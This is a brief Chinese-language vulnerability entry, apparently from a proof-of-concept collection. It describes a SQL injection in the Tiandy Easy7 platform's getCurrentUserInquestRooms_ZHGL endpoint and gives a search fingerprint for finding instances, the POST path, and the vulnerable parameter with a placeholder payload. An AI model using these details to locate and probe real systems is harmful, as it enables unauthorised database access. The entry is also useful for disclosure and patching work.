# 天地伟业Easy7getCurrentUserInquestRooms_ZHGL存在SQL注入漏洞

天地伟业 ｜ SQL注入 ｜ —
- **指纹**：`app="Tiandy-Easy7"`
- **请求**：`POST /Easy7/rest/inquestRoom/getCurrentUserInquestRooms_ZHGL HTTP/1.1`

**Payload**
```
currentCourtFjm=SQLI_POC
```
- **响应特征**：200